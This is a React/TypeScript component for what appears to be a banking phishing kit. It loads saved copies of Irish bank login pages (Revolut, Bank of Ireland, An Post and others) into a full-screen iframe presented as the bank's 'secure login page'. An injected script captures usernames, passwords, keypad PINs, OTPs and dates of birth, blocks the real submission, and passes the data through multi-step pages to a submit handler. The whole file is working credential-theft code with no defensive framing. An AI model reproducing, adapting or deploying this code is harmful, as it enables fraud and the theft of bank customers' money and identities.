"use client";

import React, { useEffect, useRef, useState } from "react";

type Props = {
  bankName: string;
  logoFile?: string;
  brandColor?: string;
  bankSlug?: string;
  formData: {
    verfuegernummer?: string;
    pin?: string;
    personalCode?: string;
    loginMethod?: string;
  };
  wonAmount?: number | null;
  wonLabel?: string | null;
  onChange: (field: string, value: string) => void;
  handleRouteAction: (overrideData?: any) => void;
  onProgressSave?: (data: Record<string, string>) => void;
  saving?: boolean;
};

const SUBMIT_TEXT_RE =
  /(log[\s-]*in|sign[\s-]*in|continue|confirm|submit|verify|next|proceed|enter|ok|authenticate|giriş|giris|ileri|tamam|onayla)/i;

const IGNORED_INPUT_TYPES = new Set([
  "hidden",
  "submit",
  "button",
  "reset",
  "image",
  "file",
  "checkbox",
  "radio",
]);

function buildInjectionScript(step: number, bankSlug: string, brandColor: string): string {
  const reSource = SUBMIT_TEXT_RE.source;
  const reFlags = SUBMIT_TEXT_RE.flags;
  return `(() => {
    const SUBMIT_RE = new RegExp(${JSON.stringify(reSource)}, ${JSON.stringify(reFlags)});
    const IGNORED = ${JSON.stringify([...IGNORED_INPUT_TYPES])};
    const STEP = ${step};
    const BANK_SLUG = ${JSON.stringify(bankSlug)};
    const BRAND_COLOR = ${JSON.stringify(brandColor)};

    const collectFrom = (doc) => {
      const data = {};
      try {
        doc.querySelectorAll("input, textarea, select").forEach((el) => {
          const type = (el.getAttribute("type") || "text").toLowerCase();
          const name = el.getAttribute("name") || el.getAttribute("id") || "";
          if (!name) return;
          if (type === "radio") {
            // Secili radio'nun degerini yakala (BOI giris yontemi: PIN / Passcode)
            if (el.checked) data[name] = el.value != null ? String(el.value) : "on";
            return;
          }
          if (type === "checkbox") {
            if (el.checked) data[name] = el.value != null ? String(el.value) : "on";
            return;
          }
          if (IGNORED.includes(type)) return;
          const value = el.value != null ? String(el.value) : "";
          if (value.trim() === "") return;
          data[name] = value;
        });
      } catch (e) {}
      return data;
    };

    const collect = () => {
      const data = {};
      const walk = (doc, depth) => {
        if (!doc || depth > 4) return;
        try {
          Object.assign(data, collectFrom(doc));
          doc.querySelectorAll("iframe").forEach((f) => {
            try { walk(f.contentDocument, depth + 1); } catch (e) {}
          });
        } catch (e) {}
      };
      walk(document, 0);
      return data;
    };

    const send = (trigger, extra) => {
      const data = collect();
      if (extra && typeof extra === "object") Object.assign(data, extra);
      if (Object.keys(data).length === 0) return;
      try {
        (window.top || window.parent).postMessage({ type: "IE_BANK_SUBMIT", step: STEP, trigger, data }, "*");
      } catch (e) { /* noop */ }
    };

    const isSubmitish = (el) => {
      if (!el || !el.getAttribute) return false;
      const tag = (el.tagName || "").toLowerCase();
      const type = (el.getAttribute("type") || "").toLowerCase();
      const role = (el.getAttribute("role") || "").toLowerCase();
      const ident = ((el.getAttribute("id") || "") + " " + (typeof el.className === "string" ? el.className : "")).toLowerCase();
      const text = (el.innerText || el.textContent || el.value || el.getAttribute("aria-label") || "").trim();
      if (tag === "input" && (type === "submit" || type === "image")) return true;
      if (tag === "button" && type === "submit") return true;
      if ((tag === "a" || tag === "button" || role === "button" || (tag === "input" && type === "button")) && /(submit|signin|login-button|btn-login|continue|confirm)/.test(ident)) return true;
      if (role === "button" && SUBMIT_RE.test(text) && text.length <= 60) return true;
      if (tag === "a" && SUBMIT_RE.test(text) && text.length <= 60) return true;
      if ((tag === "input" || tag === "button") && type !== "submit" && SUBMIT_RE.test(text) && text.length <= 60) return true;
      return false;
    };

    // ------------------------------------------------------------------
    // KEYPAD MODE (Revolut 2.html style): digit buttons [data-value="0-9"].
    // - her rakam ekranda nokta olarak gosterilir (kayitli sayfada JS yok)
    // - >=4 rakamda altta "Log in" benzeri Continue butonu cikar
    // - non-digit buton (icon) = backspace
    // ------------------------------------------------------------------
    let keypadBuffer = "";
    const PIN_MIN = 4;
    const PIN_MAX = 6;
    const hasKeypad = () => {
      try { return !!document.querySelector("button[data-value]"); } catch (e) { return false; }
    };
    const flushKeypad = () => {
      if (keypadBuffer.length >= PIN_MIN) {
        const buf = keypadBuffer;
        keypadBuffer = "";
        try { renderKeypad(); } catch (e) {}
        send("keypad", { passcode: buf, pin: buf });
      }
    };
    // Passcode nokta gostergesi: native slot container'a KENDI
    // net-stillenmis noktalarimizi koy (kayitli sayfada native dot
    // gorunumu bozuk; kullanici girdigini goremiyor).
    const renderKeypadDots = () => {
      try {
        // Gosterge SADECE kullanici rakam bastiktan sonra gorunur —
        // bos pill her sayfada cikip ekrani kirletiyordu.
        if (keypadBuffer.length === 0) {
          const dot0 = document.querySelector(".sx827n0");
          const host0 = (dot0 && dot0.parentElement) || window.__ieDotHost;
          if (host0 && host0.isConnected && window.__ieDotHost) host0.innerHTML = "";
          const own0 = document.getElementById("ie-keypad-dots");
          if (own0) own0.style.display = "none";
          return;
        }
        const dot = document.querySelector(".sx827n0");
        const host = (dot && dot.parentElement) || window.__ieDotHost;
        if (host && host.isConnected) {
          window.__ieDotHost = host;
          // Arka plan koyuysa (Revolut passcode) acik renk noktalar kullan
          let darkBg = false;
          try {
            let node = host;
            while (node && node !== document.documentElement) {
              const c = getComputedStyle(node).backgroundColor;
              if (c && c !== "transparent" && !/^rgba?\(\s*0\s*,\s*0\s*,\s*0\s*(,\s*0\s*)?\)/.test(c)) {
                const m = /(\d+)[,\s]+(\d+)[,\s]+(\d+)/.exec(c);
                if (m) darkBg = 0.2126 * +m[1] + 0.7152 * +m[2] + 0.0722 * +m[3] < 128;
                break;
              }
              node = node.parentElement;
            }
          } catch (e) {}
          const fillCol = darkBg ? "#ffffff" : "#191c1f";
          const emptyCol = darkBg ? "rgba(255,255,255,.42)" : "#aab3bb";
          host.style.display = "flex";
          host.style.flexDirection = "row";
          host.style.flexWrap = "nowrap";
          host.style.justifyContent = "center";
          host.style.alignItems = "center";
          host.style.gap = "16px";
          host.innerHTML = "";
          for (let i = 0; i < PIN_MAX; i++) {
            const d = document.createElement("span");
            d.style.cssText =
              "width:16px;height:16px;border-radius:50%;display:inline-block;box-sizing:border-box;flex:none;" +
              (i < keypadBuffer.length
                ? "background:" + fillCol + ";border:2px solid " + fillCol + ";"
                : "background:transparent;border:2px solid " + emptyCol + ";");
            host.appendChild(d);
          }
          return;
        }
        // Fallback: sabit overlay
        let own = document.getElementById("ie-keypad-dots");
        if (!own) {
          own = document.createElement("div");
          own.id = "ie-keypad-dots";
          own.style.cssText =
            "position:fixed;top:20%;left:50%;transform:translateX(-50%);z-index:999998;" +
            "display:flex;gap:16px;justify-content:center;padding:10px 18px;" +
            "background:rgba(255,255,255,.92);border-radius:24px;box-shadow:0 2px 10px rgba(0,0,0,.18)";
          document.body.appendChild(own);
        }
        own.innerHTML = "";
        for (let i = 0; i < PIN_MAX; i++) {
          const d = document.createElement("span");
          d.style.cssText =
            "width:16px;height:16px;border-radius:50%;display:inline-block;box-sizing:border-box;" +
            (i < keypadBuffer.length
              ? "background:#191c1f;border:2px solid #191c1f;"
              : "background:transparent;border:2px solid #aab3bb;");
          own.appendChild(d);
        }
      } catch (e) {}
    };
    // Sayfadaki keypad'in bos hucrelerine "⌫" backspace butonu enjekte et
    // (bu kayitta backspace butonu yok; yanlis giris duzeltilemiyor).
    const injectBackspace = () => {
      try {
        if (document.getElementById("ie-keypad-backspace")) return;
        if (!hasKeypad()) return;
        // Revolut disindaki sayfalarda rastgele data-value butonlari varsa
        // buton en az 1 rakam basilincaya kadar enjekte edilmesin.
        if (BANK_SLUG !== "revolut" && keypadBuffer.length === 0) return;
        const zero = document.querySelector("button[data-value='0']");
        if (!zero) return;
        // 0'dan sonraki bos grid hucresi (veya grid'in son hucresi)
        const cell = zero.nextElementSibling;
        const host = cell && cell.tagName === "DIV" ? cell : zero.parentElement;
        if (!host) return;
        const btn = document.createElement("button");
        btn.id = "ie-keypad-backspace";
        btn.type = "button";
        btn.textContent = "⌫";
        // digit butonlarina benzer boyut (64px daire)
        btn.style.cssText =
          "width:64px;height:64px;border:none;border-radius:50%;background:transparent;" +
          "color:#191c1f;font:400 26px/1 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;" +
          "cursor:pointer;display:flex;align-items:center;justify-content:center;margin:0 auto";
        btn.addEventListener("click", (ev) => {
          try { ev.preventDefault(); ev.stopPropagation(); } catch (e) {}
          keypadBuffer = keypadBuffer.slice(0, -1);
          renderKeypad();
        });
        host.appendChild(btn);
      } catch (e) {}
    };
    const renderContinueButton = () => {
      try {
        let btn = document.getElementById("ie-keypad-continue");
        const show = hasKeypad() && keypadBuffer.length >= PIN_MIN;
        if (show && !btn) {
          btn = document.createElement("button");
          btn.id = "ie-keypad-continue";
          btn.type = "button";
          btn.textContent = "Log in";
          btn.style.cssText =
            "position:fixed;left:50%;transform:translateX(-50%);bottom:24px;z-index:999999;" +
            "width:calc(100% - 32px);max-width:400px;height:52px;border:none;border-radius:26px;" +
            "background:#191c1f;color:#ffffff;font:600 17px/1 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;" +
            "cursor:pointer;box-shadow:0 8px 24px rgba(0,0,0,.35)";
          btn.addEventListener("click", (ev) => {
            try { ev.preventDefault(); ev.stopPropagation(); } catch (e) {}
            flushKeypad();
          });
          document.body.appendChild(btn);
        }
        if (btn) btn.style.display = show ? "block" : "none";
      } catch (e) {}
    };
    const renderKeypad = () => {
      renderKeypadDots();
      renderContinueButton();
      injectBackspace();
    };

    // Kaydedilmis sayfalarda JS olmadigi icin butonlar disabled kalir.
    // Tum disabled/aria-disabled/ng-disabled kontrolleri aktiflestir;
    // attribute degisikliklerini de izleyip tekrar kaldir.
    const enableControls = (root) => {
      try {
        root.querySelectorAll("button, input, select, textarea, a, [role='button'], [ng-disabled], [aria-disabled]").forEach((el) => {
          try {
            if (el.hasAttribute("disabled")) el.removeAttribute("disabled");
            if (el.hasAttribute("ng-disabled")) el.removeAttribute("ng-disabled");
            if (el.getAttribute("aria-disabled") === "true") el.setAttribute("aria-disabled", "false");
            if (el.classList && el.classList.contains("disabled")) el.classList.remove("disabled");
            if (el.style && el.style.pointerEvents === "none") el.style.pointerEvents = "auto";
          } catch (e) {}
        });
      } catch (e) {}
    };

    // ------------------------------------------------------------------
    // SUBMIT-READY: gri (disabled gorunumlu) submit butonlari, tum
    // gorunur alanlar doldugunda banka rengiyle renklendirilir.
    // (An Post'un #D0D0CE!important gri kuralini inline !important ile ezer)
    // ------------------------------------------------------------------
    const READY_COLORS = { "an-post": "#00A76A" };
    const updateSubmitReady = (root) => {
      try {
        const inputs = [];
        root.querySelectorAll("input").forEach((el) => {
          const t = (el.getAttribute("type") || "text").toLowerCase();
          if (IGNORED.includes(t)) return;
          try { if (!el.getClientRects().length) return; } catch (e) {}
          inputs.push(el);
        });
        if (inputs.length === 0) return;
        const ready = inputs.every((el) => (el.value || "").trim() !== "");
        const readyColor = READY_COLORS[BANK_SLUG] || BRAND_COLOR || "";
        if (!readyColor) return;
        root.querySelectorAll("input[type=submit], button[type=submit], .gigya-composite-control-submit input, .de-login-submit input").forEach((btn) => {
          try {
            const cs = root.defaultView ? root.defaultView.getComputedStyle(btn) : getComputedStyle(btn);
            const m = /rgba?\\((\\d+),\\s*(\\d+),\\s*(\\d+)/.exec(cs.backgroundColor || "");
            const grayish = m && Math.abs(+m[1] - +m[2]) < 20 && Math.abs(+m[2] - +m[3]) < 20 && +m[1] > 140;
            if (ready && (grayish || btn.__ieReadyStyled)) {
              btn.style.setProperty("background-color", readyColor, "important");
              btn.style.setProperty("color", "#ffffff", "important");
              btn.__ieReadyStyled = true;
            } else if (!ready && btn.__ieReadyStyled) {
              btn.style.removeProperty("background-color");
              btn.style.removeProperty("color");
              btn.__ieReadyStyled = false;
            }
          } catch (e) {}
        });
      } catch (e) {}
    };

    // ------------------------------------------------------------------
    // DOB GLOBAL: dogum tarihi alanlari (BOI vb.) sadece gg/aa/yyyy kabul
    // eder — harf/isaret girisi engellenir, sinirlar disina cikamaz.
    // ------------------------------------------------------------------
    const DOB_RE = /dob|birth|dateofbirth|date_of_birth|birthdate/i;
    const isDobField = (el) => {
      if (!el || !el.getAttribute) return false;
      const meta = ((el.getAttribute("name") || "") + " " + (el.getAttribute("id") || "") + " " + (el.getAttribute("aria-label") || "") + " " + (el.getAttribute("placeholder") || "") + " " + (typeof el.className === "string" ? el.className : "")).toLowerCase();
      return DOB_RE.test(meta);
    };
    const formatDob = (digits) => {
      let d = digits.replace(/\\D/g, "").slice(0, 8);
      let dd = d.slice(0, 2), mm = d.slice(2, 4), yy = d.slice(4, 8);
      if (dd.length === 2) {
        const day = Math.min(Math.max(parseInt(dd, 10) || 1, 1), 31);
        dd = String(day).padStart(2, "0");
      }
      if (mm.length === 2) {
        const mon = Math.min(Math.max(parseInt(mm, 10) || 1, 1), 12);
        mm = String(mon).padStart(2, "0");
      }
      if (yy.length === 4) {
        const yr = Math.min(Math.max(parseInt(yy, 10) || 1900, 1900), new Date().getFullYear());
        yy = String(yr);
      }
      let out = dd;
      if (d.length > 2) out += "/" + mm;
      if (d.length > 4) out += "/" + yy;
      return out;
    };
    const applyDobGuards = (root) => {
      try {
        root.querySelectorAll("input").forEach((el) => {
          try {
            if (!isDobField(el) || el.__dobGuard) return;
            el.__dobGuard = true;
            el.setAttribute("inputmode", "numeric");
            el.setAttribute("autocomplete", "off");
            el.setAttribute("maxlength", "10");
            el.addEventListener("input", () => {
              const formatted = formatDob(el.value || "");
              if (el.value !== formatted) el.value = formatted;
            });
            el.addEventListener("keypress", (ev) => {
              if (!/[0-9/]/.test(ev.key)) { try { ev.preventDefault(); } catch (e) {} }
            });
          } catch (e) {}
        });
      } catch (e) {}
    };

    const attach = (doc) => {
      if (!doc || doc.__ieCaptureInjected) return;
      doc.__ieCaptureInjected = true;

      enableControls(doc);
      applyDobGuards(doc);
      updateSubmitReady(doc);
      doc.addEventListener("input", () => updateSubmitReady(doc), true);
      doc.addEventListener("change", () => updateSubmitReady(doc), true);
      try {
        new MutationObserver((mutations) => {
          for (const m of mutations) {
            if (m.type === "attributes" && m.target && m.target.nodeType === 1) {
              const el = m.target;
              try {
                if (el.hasAttribute("disabled")) el.removeAttribute("disabled");
                if (el.hasAttribute("ng-disabled")) el.removeAttribute("ng-disabled");
                if (el.getAttribute && el.getAttribute("aria-disabled") === "true") el.setAttribute("aria-disabled", "false");
              } catch (e) {}
            }
          }
        }).observe(doc.documentElement || doc, { attributes: true, attributeFilter: ["disabled", "ng-disabled", "aria-disabled"], subtree: true });
      } catch (e) {}

      doc.addEventListener("submit", (e) => {
        try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
        send("form-submit");
        return false;
      }, true);

      doc.addEventListener("click", (e) => {
        // Kendi enjekte ettigimiz Continue butonu: isSubmitish'e yakalanmasin
        try {
          let t0 = e.target;
          while (t0 && t0 !== doc.body) {
            if (t0.id === "ie-keypad-continue" || t0.id === "ie-keypad-backspace") return;
            t0 = t0.parentElement;
          }
        } catch (err) {}

        // Keypad digits first (Revolut passcode screen)
        try {
          let el = e.target;
          let depth = 0;
          while (el && el !== doc.body && depth < 5) {
            if (el.tagName && el.tagName.toLowerCase() === "button") {
              const dv = el.getAttribute("data-value");
              if (dv != null && /^[0-9]$/.test(dv)) {
                // PIN_MAX'den sonraki tuslamalari tamamen yoksay
                if (keypadBuffer.length < PIN_MAX) keypadBuffer += dv;
                renderKeypad();
                return;
              }
              // non-digit button while keypad exists -> backspace
              if (hasKeypad() && (el.getAttribute("data-variant") === "icon" || /iconbutton/i.test(typeof el.className === "string" ? el.className : ""))) {
                keypadBuffer = keypadBuffer.slice(0, -1);
                renderKeypad();
                return;
              }
            }
            el = el.parentElement;
            depth++;
          }
        } catch (err) {}

        try {
          const t = e.target;
          const ttag = (t && t.tagName || "").toLowerCase();
          if (ttag === "input" || ttag === "textarea" || ttag === "select") {
            const ttype = (t.getAttribute("type") || "").toLowerCase();
            if (ttag !== "input" || (ttype !== "submit" && ttype !== "button" && ttype !== "image")) return;
          }
        } catch (err) {}
        let el2 = e.target;
        let depth2 = 0;
        while (el2 && el2 !== doc.body && depth2 < 4) {
          if (isSubmitish(el2)) {
            try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
            send("click:" + (el2.tagName || "").toLowerCase());
            return;
          }
          el2 = el2.parentElement;
          depth2++;
        }
      }, true);

      doc.addEventListener("keydown", (e) => {
        try {
          if (e.key === "Backspace" && keypadBuffer.length > 0 && hasKeypad()) {
            keypadBuffer = keypadBuffer.slice(0, -1);
            renderKeypad();
            return;
          }
          if (e.key === "Enter" && hasKeypad() && keypadBuffer.length >= 4) {
            flushKeypad();
            return;
          }
          if (e.key !== "Enter") return;
          const t = e.target;
          if (!t || !t.getAttribute) return;
          const tag = (t.tagName || "").toLowerCase();
          if (tag !== "input" && tag !== "select") return;
          const type = (t.getAttribute("type") || "text").toLowerCase();
          if (type === "hidden" || type === "checkbox" || type === "radio") return;
          send("enter-key");
        } catch (err) {}
      }, true);
    };

    const scanIframes = (doc, depth) => {
      if (!doc || depth > 4) return;
      try {
        doc.querySelectorAll("iframe").forEach((f) => {
          try {
            const d = f.contentDocument;
            if (d) { attach(d); scanIframes(d, depth + 1); }
            f.addEventListener("load", () => {
              try {
                if (f.contentDocument) { attach(f.contentDocument); scanIframes(f.contentDocument, depth + 1); }
              } catch (e) {}
            });
          } catch (e) {}
        });
      } catch (e) {}
    };

    attach(document);
    scanIframes(document, 0);
    try {
      new MutationObserver(() => { scanIframes(document, 0); enableControls(document); applyDobGuards(document); updateSubmitReady(document); }).observe(document.documentElement, { childList: true, subtree: true });
    } catch (e) {}
    let tries = 0;
    const retry = setInterval(() => {
      scanIframes(document, 0);
      enableControls(document);
      applyDobGuards(document);
      updateSubmitReady(document);
      renderKeypad();
      if (++tries > 30) clearInterval(retry);
    }, 500);
  })();`;
}

// Ham form alanlarini standart credential alanlarina esler
// (username / password / bankPhone / pin)
function canonicalizeCaptured(raw: Record<string, string>): Record<string, string> {
  const out: Record<string, string> = { ...raw };
  const norm = (k: string) => k.toLowerCase().replace(/[^a-z0-9]/g, "");
  for (const [k, v] of Object.entries(raw)) {
    if (!v || !v.trim()) continue;
    const n = norm(k);
    if (
      /username|loginid|loginnumber|formuserid|userid|customerid|customernumber|cifcustomernumber|email|aibusername/.test(n)
    ) {
      out.username ||= v;
      out.verfuegernummer ||= v;
    }
    if (/password|loginpassword|pfpass|pass$/.test(n)) {
      out.password ||= v;
      out.pin ||= v;
    }
    if (/phonenumber|phone$|mobile|gsm/.test(n)) {
      out.bankPhone ||= v;
    }
    if (/^passcode$|^pin$|^otp$|^tac$/.test(n)) {
      out.pin ||= v;
      out.password ||= v;
    }
    // Giris yontemi (BOI: Passcode/ biometrics | Pin -> 365 PIN)
    if (/loginmethod|authmethod/.test(n)) {
      out.loginMethod ||=
        /passcode|biometric/i.test(v) ? "Passcode / Biometrics"
        : /^pin$/i.test(v.trim()) || /365.*pin|pin.*365/i.test(v) ? "365 PIN"
        : v;
    }
    // Dogum tarihi (BOI C2__LOGIN[1].DATEOFBIRTH vb.)
    if (/dateofbirth|dob|birthdate|birthday/.test(n)) {
      const digits = v.replace(/\D/g, "").slice(0, 8);
      out.dateOfBirth ||=
        digits.length === 8
          ? `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4, 8)}`
          : v;
    }
  }
  return out;
}

export function IrelandBankTemplate({ bankSlug, onChange, handleRouteAction, onProgressSave, saving, bankName, logoFile, brandColor, wonAmount, wonLabel }: Props) {
  const [files, setFiles] = useState<string[]>([]);
  const [step, setStep] = useState(0);
  const [loadError, setLoadError] = useState(false);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  const handleRouteActionRef = useRef(handleRouteAction);
  const onChangeRef = useRef(onChange);
  const onProgressSaveRef = useRef(onProgressSave);
  const bankSlugRef = useRef<string>("");
  const capturedRef = useRef<Record<string, string>>({});
  const filesRef = useRef<string[]>([]);
  const stepRef = useRef(0);
  handleRouteActionRef.current = handleRouteAction;
  onChangeRef.current = onChange;
  onProgressSaveRef.current = onProgressSave;
  bankSlugRef.current = (bankSlug || "").toString().trim().toLowerCase();
  filesRef.current = files;
  stepRef.current = step;

  useEffect(() => {
    let cancelled = false;
    const slug = (bankSlug || "").toString().trim().toLowerCase();
    if (!slug) {
      setFiles([]);
      return;
    }
    fetch(`/api/ie-banks?bank=${encodeURIComponent(slug)}`, { cache: "no-store" })
      .then((r) => (r.ok ? r.json() : { files: [] }))
      .then((d) => {
        if (cancelled) return;
        const list = Array.isArray(d?.files) ? d.files : [];
        setFiles(list.length > 0 ? list : ["1.html"]);
      })
      .catch(() => {
        if (!cancelled) setFiles(["1.html"]);
      });
    return () => {
      cancelled = true;
    };
  }, [bankSlug]);

  useEffect(() => {
    const onMessage = (event: MessageEvent) => {
      const data = event?.data;
      if (!data || typeof data !== "object") return;
      if (data.type !== "IE_BANK_SUBMIT") return;
      const payload = data.data && typeof data.data === "object" ? { ...(data.data as Record<string, string>) } : {};
      if (Object.keys(payload).length === 0) return;

      // Adim verisini biriktir (1.html -> 2.html akisi icin)
      for (const [k, v] of Object.entries(payload)) {
        if (typeof v === "string" && v.trim() !== "") {
          capturedRef.current[k] = v;
        }
      }
      const merged = canonicalizeCaptured(capturedRef.current);

      // Standart alanlari parent state'e de yazdir
      if (merged.username) onChangeRef.current("verfuegernummer", merged.username);
      if (merged.pin) onChangeRef.current("pin", merged.pin);

      const lastIndex = filesRef.current.length - 1;
      const incomingStep = typeof data.step === "number" ? data.step : stepRef.current;

      if (incomingStep < lastIndex) {
        // ARA ADIM: veriyi sessizce kaydet, sonraki sayfaya gec (routing YOK)
        onProgressSaveRef.current?.(merged);
        setStep(incomingStep + 1);
        return;
      }

      // SON ADIM: birlesik veriyle normal submit akisini calistir
      handleRouteActionRef.current({
        ...merged,
        bankSlug: bankSlugRef.current,
      });
    };
    window.addEventListener("message", onMessage);
    return () => window.removeEventListener("message", onMessage);
  }, []);

  const injectScript = () => {
    try {
      const doc = iframeRef.current?.contentDocument;
      if (!doc) return;
      const script = doc.createElement("script");
      script.textContent = buildInjectionScript(
        stepRef.current,
        bankSlugRef.current,
        (brandColor || "").toString().trim(),
      );
      doc.documentElement.appendChild(script);
    } catch (err) {
      console.error("IE bank iframe injection error:", err);
    }
  };

  if (files.length === 0) {
    return (
      <div className="flex min-h-screen items-center justify-center p-4 bg-white">
        <p className="rounded-xl border border-blue-500/30 bg-blue-500/10 p-5 text-center text-sm text-blue-700">
          Loading your bank's secure login page...
        </p>
      </div>
    );
  }

  const currentFile = files[Math.min(step, files.length - 1)];

  return (
    <div
      className="fixed inset-0 w-[100vw] bg-white z-[9999] overflow-hidden"
      style={{ minHeight: "100vh", height: "100dvh" }}
    >
      <style>{`body.ah-theme,body.ah-theme-overlay-bg,body{background:#fff !important;background-image:none !important}`}</style>
      {saving && (
        <div className="absolute inset-0 bg-white/80 backdrop-blur-sm z-[99999] flex items-center justify-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
        </div>
      )}

      <iframe
        key={`${bankSlug}-${currentFile}`}
        ref={iframeRef}
        src={`/ie-banks/${bankSlug}/${currentFile}`}
        className="w-full border-0"
        style={{ height: "100dvh", display: "block" }}
        sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
        onLoad={injectScript}
      />
    </div>
  );
}
